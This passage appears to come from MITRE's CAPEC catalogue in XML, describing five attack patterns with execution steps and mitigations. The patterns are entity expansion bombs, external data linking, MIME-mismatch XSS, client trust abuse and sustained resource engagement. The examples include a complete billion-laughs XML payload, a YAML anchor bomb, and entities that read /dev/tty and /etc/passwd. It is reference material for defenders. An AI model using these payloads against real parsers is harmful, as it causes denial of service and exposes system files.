         <ns0:Description>An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.</ns0:Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>Billion Laughs Attack</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>XML Bomb</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>XML Entity Expansion (XEE)</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="230" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using subsitituion on the victim's side.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process requests.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft malicious payload] The adversary crafts a malicious message containing nested exponential expansion that completely uses up available server resources. See the "Example Instances" section for details on how to craft this malicious payload.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Send the message] Send the malicious crafted message to the target URL.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of attack requires that the target must receive input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Ability to craft nested data expansion messages.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
               <ns0:Impact>Resource Consumption</ns0:Impact>
               <ns0:Note>Denial of Service</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The most common example of this type of attack is the "many laughs" attack (sometimes called the 'billion laughs' attack). For example:</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;?xml version="1.0"?&gt;<html:br />&lt;!DOCTYPE lolz [<html:div style="margin-left:1em;">&lt;!ENTITY lol "lol"&gt;<html:br />&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<html:br />&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<html:br />&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<html:br />&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<html:br />&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<html:br />&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6"&gt;<html:br />&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<html:br />&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</html:div>
                  <html:br />]&gt;<html:br />&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</html:div>
               <html:p>This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>This example is similar, but uses YAML. This was used to attack Kubernetes [REF-686]</html:p>
               <html:div style="margin-left:1em;" class="informative">a: &amp;a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]<html:br />b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]<html:br />c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]<html:br />d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]<html:br />e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]<html:br />f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]<html:br />g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]<html:br />h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]<html:br />i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
            <ns0:Related_Weakness CWE_ID="776" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>44</ns0:Entry_ID>
               <ns0:Entry_Name>XML Entity Expansion</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-64" />
            <ns0:Reference External_Reference_ID="REF-65" />
            <ns0:Reference External_Reference_ID="REF-66" />
            <ns0:Reference External_Reference_ID="REF-67" />
            <ns0:Reference External_Reference_ID="REF-67" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Alternate_Terms, Description, Example_Instances, Execution_Flow, Mitigations, Prerequisites, Related_Weaknesses, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2021-10-21">XML Entity Expansion</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="201" Name="Serialized Data External Linking" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary creates a serialized data file (e.g. XML, YAML, etc...) that contains an external data reference. Because serialized data parsers may not validate documents with external references, there may be no checks on the nature of the reference in the external data. This can allow an adversary to open arbitrary files or connections, which may further lead to the adversary gaining access to information on the system that they would normally be unable to obtain.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122">
               <ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="278" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an adversary records all instances of web services that process requests with serialized data.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs that process requests with serialized data.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes serialized data requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft malicious payload] The adversary crafts malicious data message that contains references to sensitive files.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Launch an External Linking attack] Send the malicious crafted message containing the reference to a sensitive file to the target URL.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must follow external data references without validating the validity of the reference target.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To send serialized data messages with maliciously crafted schema.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Configure the serialized data processor to only retrieve external entities from trusted sources.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>The following DTD would attempt to open the /dev/tty device:</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;!DOCTYPE doc [ &lt;!ENTITY ent SYSTEM "file:///dev/tty"&gt; ]&gt;</html:div>
               <html:p>A malicious actor could use this crafted DTD to reveal sensitive information.</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>The following XML snippet would attempt to open the /etc/passwd file:</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt; &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-73" />
            <ns0:Reference External_Reference_ID="REF-74" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Payload_Activation_Impact, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Execution_Flow, Mitigations, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Consequences, Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2018-07-31">XML Entity Blowup</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2020-07-30">XML Entity Linking</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="209" Name="XSS Using MIME Type Mismatch" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="592" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to file upload features</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the "Explore" phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.</ns0:Description>
               <ns0:Technique>Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.</ns0:Description>
               <ns0:Technique>Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.</ns0:Description>
               <ns0:Technique>Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.</ns0:Technique>
               <ns0:Technique>Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.</ns0:Prerequisite>
            <ns0:Prerequisite>The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>The adversary must have the ability to source the file of the incorrect MIME type containing a script.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Example_Instances>
            <ns0:Example>For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.</ns0:Example>
            <ns0:Example>In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="79" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="646" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-78" Section="Testing for Stored Cross site scripting (OWASP-DV-002)" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Cross-Site Scripting Using MIME Type Mismatch</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="22" Name="Exploiting Trust in Client" Abstraction="Meta" Status="Draft">
         <ns0:Description>An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Ability to communicate synchronously or asynchronously with server</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.</ns0:Mitigation>
            <ns0:Mitigation>Design: Do not rely on client validation or encoding for security purposes.</ns0:Mitigation>
            <ns0:Mitigation>Design: Utilize digital signatures to increase authentication assurance.</ns0:Mitigation>
            <ns0:Mitigation>Design: Utilize two factor authentication to increase authentication assurance.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Perform input validation for all remote content.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.</ns0:Example>
            <ns0:Example>Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.</ns0:Example>
            <ns0:Example>Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.</ns0:Example>
            <ns0:Example>Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="290" />
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="200" />
            <ns0:Related_Weakness CWE_ID="693" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description Summary, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2015-12-07">Exploiting Trust in Client (aka Make the Client Invisible)</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="227" Name="Sustained Client Engagement" Abstraction="Meta" Status="Draft">
         <ns0:Description>An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual.</html:p>
         </ns0:Extended_Description>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Resources_Required>
            <ns0:Resource>To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Mitigations>
            <ns0:Mitigation>Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="400" />
         </ns0:Related_Weaknesses>
